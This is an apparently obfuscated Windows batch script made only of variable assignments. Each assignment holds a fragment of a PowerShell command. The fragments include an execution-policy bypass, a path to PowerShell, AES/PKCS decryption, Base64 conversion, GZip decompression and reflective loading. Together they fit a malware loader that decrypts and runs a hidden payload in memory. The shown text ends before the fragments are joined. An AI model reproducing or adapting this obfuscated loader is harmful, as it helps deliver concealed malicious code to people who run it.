@echo off
set "jCxrzRrJHx=y "
set "WjjwbrEHdf=xe"
set "UCEZCxgNQP=co"
set "czMIknolhH= C"
set "FhrORBKSIR=we"
set "IIjCoPgyaR=:\"
set "xatxeppMhB=.e"
set "tlRSzHNhBr=he"
set "NCFhXompOZ=Wi"
set "XDXWUZBjtS=po"
set "cLtQwYdOBy=we"
set "aYwhftIVJT=Sy"
set "NCqrGBOUVb=0\"
set "VtJHyGFcNK=\v"
set "fTibHNahnJ=\W"
set "zuugbQwdLs=em"
set "AklSnkxxdO=32"
set "wZujxejSNq=py"
set "vyrmdFmsyo=ws"
set "UmkGouqzoj=1."
set "XKSVCAUFKV=s\"
set "BoZoSvPWOo=nd"
set "WHolOsdsaX=rs"
set "kouPSnhDvC=ll"
set "DyECwFEqgp=in"
set "akKLITWvai=st"
set "RKgMNqpnLo=he"
set "PjJOoehsyQ=rS"
set "IPdmFPCSdN= /"
set "TgfvhbjAUI=ll"
set "PpQcPbFJwH=Po"
set "iUFjhOPSVH=ow"
set "WEjqsQYRxy=do"
set "BQKTYdkWwU=cd"
set "YueJndzfpP= %~dp0"
set "nbwUypGACA=comp"
set "FpdEMjftIC=VKcy"
set "kweFtzrEEX=gnir"
set "NMpctpeyCG=tem."
set "yoCdbbnnZI=)))"
set "jJgqIuuDxm=ode]"
set "MKSYpLTacP=  $k"
set "ezePJhsuIJ=brea"
set "LvDPGjQsro=nirt"
set "OqqusEFUGd=.Len"
set "CrpByEnilN=rtS4"
set "OaqjUwFEkd= [Sy"
set "CgEuRznXqB=IoO3"
set "TXLdtqszJM=ispo"
set "fpXQFnhXBa=$UNx"
set "yhULuISiQq=] -j"
set "tlYFrPqUep=1..-"
set "ijiKZpDuSe=ptog"
set "hUNQtHKIxF=saBm"
set "gzyPNIRVZa=ateD"
set "AoPIokGNYC=sVKc"
set "VOkLqZXSYa=..-1"
set "SGuGMrzdGI=);$s"
set "KyPpOOXEoL=grap"
set "RzviAYwPtY=New-"
set "vsOeFfRoRe=();$"
set "WApKefBeaJ== [S"
set "juPNXvgAhw=-Obj"
set "NmNIOpQCUZ=[Sys"
set "QuWTDpyUGx=Secu"
set "RiPlMcOtWk=rity"
set "vrCiGHJoek=Hvck"
set "MYYAFLPDoT=hNFV"
set "MGiobgRyMi=bjec"
set "ifRgdCYGIR=VKcy"
set "bbKLvYVDaj=m(, "
set "lGEmZiSGAc=in $"
set "ydEHspeIoH=pher"
set "fCdhXeayoh=ptog"
set "DGRyQoVRAn=2VUN"
set "obWJJMrqwH=gth)"
set "qtEZnCednW=::De"
set "DLykxEOZOh='gni"
set "UsbSQBrmdn=.Key"
set "IENrdNbXfd='oPV"
set "ZhluARMIUD=.Mod"
set "vjJrSwgfPD=ion."
set "cnvzUyKRrm==');"
set "NUbXnZrZXK=.Cop"
set "JhCJQlRupZ=.Cry"
set "QAcACsGVQE=NFV."
set "VivLAUyUja=:: '"
set "MKNUEuGhQH=)($Q"
set "fwpxkCokhr=ct S"
set "VRAfpYjHKQ=V = "
set "dXynGNczDN=ring"
set "YrbEbDMOYJ=ress"
set "HciSShaNkz=ress"
set "jwkZmScsle='txe"
set "TgRfCnxZVe=rans"
set "naDFpYtEaE=($TO"
set "hkOywVjYTy=ew-O"
set "QJFceTBHcf=LyCp"
set "RoYHtFWdqq=raph"
set "zhdoKyWkoj=k; }"
set "kniazOwRTx=zm83"
set "PzOEPSFGFi=ypto"
set "ZLAFwLitaz=, (,"
set "KHTAFFFkRf=; };"
set "tGypLvrGQr=Oxj."
set "nazJWObgUb=cy.I"
set "EmwWgovKcK=hy.A"
set "ZKGxPGSvKX=]::("
set "GsuHiXBVli=R5jf"
set "ySCZZuPgWp=ose("
set "tXuNEjvUHH=UpwX"
set "FFLVjUDBXj=ptor"
set "eCCHfhrwoL=ing("
set "SxTfGeupyi=S46e"
set "todBpqcDoT= New"
set "yUUmIabmZJ=-ep "
set "rqNSGHGYbs=-4] "
set "eLPKuipvum=se()"
set "ysmeRIHoxD=.Cry"
set "HhzxPvIxJk=tS46"
set "kMzNcCpont=nage"
set "hwzAHGDWyg=th('"
set "hSQxXjZbhp=Obje"
set "tMLrEEwjDs=dV1k"
set "psxZvpVheF=ddin"
set "FqKzjlfMUj=ect "
set "gLXHuSNtQy=pose"
set "SJeYERbdrv=ewLi"
set "AKXquodRyr=iron"
set "isCiGlnToO=.GZi"
set "gmeCSpRRJz=]::N"
set "ONUnaVEpEM=and "
set "JHMZlRHNvY=.-16"
set "nhRqoVyqMK=j = "
set "hqFmmnNtJt=Cp ="
set "ehSWquvSzU=Disp"
set "GlvPmoFuyf=fore"
set "UQtiAjJeqf=).Sp"
set "yeZNuNBSoQ=em.I"
set "qzoNdvUsYb=$sVK"
set "lsMuuaMbrS=TllA"
set "sPTbdruVHZ=m.IO"
set "ZTCUwHuktT=]::("
set "WnHEuGQGjl=Comp"
set "DFWcugKpdp=n ''"
set "VrsveLyytG=yste"
set "hbpCnDfWnb=stem"
set "oKDwZYyRnr=lBlo"
set "YgsTbqZmTL== $s"
set "OLWqDXfbnz=bypa"
set "auHnYoDrdr=$QHv"
set "ydESsEmTVn=::('"
set "fEKEwDJEJx=8kuY"
set "biLqlUahqE= = N"
set "BntemTvLUT=();$"
set "klmKKiAqzx=);$K"
set "KDVTkcEPlg=rity"
set "VWIALTAcdi=[-1."
set "LDkPQJLish=bstr"
set "UuIsYAqWew=Stre"
set "ptSxyditYL=ose("
set "SGEJrPjOps=Hvck"
set "qsMbAYrsJh=stem"
set "CWeqTIXiLh=tsWi"
set "jaAFGoxnYg=QmHy"
set "PhcwJZoVJo=ck($"
set "eYSKcUUPYO=PKCS"
set "ALCrXISndr=y.Ci"
set "MnWdhOoXlT=Xu.D"
set "lZFdLtfunT=$sLy"
set "TieRJwkDTR=QHvc"
set "aslNwyIQMa=CuSj"
set "ZUkHTHnpMq=RtP "
set "MWZWLLpaOD=rt]:"
set "mIFPLPYzBE=DYiE"
set "NdISIrdpcy=$PwO"
set "JGxJKmBrYV=pres"
set "BhCDlsspkf=stem"
set "QOsrhGWLEJ=m.Re"
set "hssPqBQoDG=[]] "
set "ORaaRyUBUV= '')"
set "NxbCtymAZZ=);$s"
set "jwVjdRrCVx=flec"
set "yiwbQFXXAH= = ["
set "wUEUHRODZl=VKcy"
set "mhYoWLESnm=u = "
set "sHGCBOulPP=-1.."
set "OXNEmWbJpy=ck ="
set "XUAfvdrLtf=null"
set "OjOarFiVSL=;$UN"
set "PElHqhmmRt=pwXu"
set "ewZZAmtFhv= '')"
set "dIrTjGPXLL=.IO."
set "BEGnDKQRkK=y]::"
set "YROVFJTzEN=VKcy"
set "EWUtrxQETG=vert"
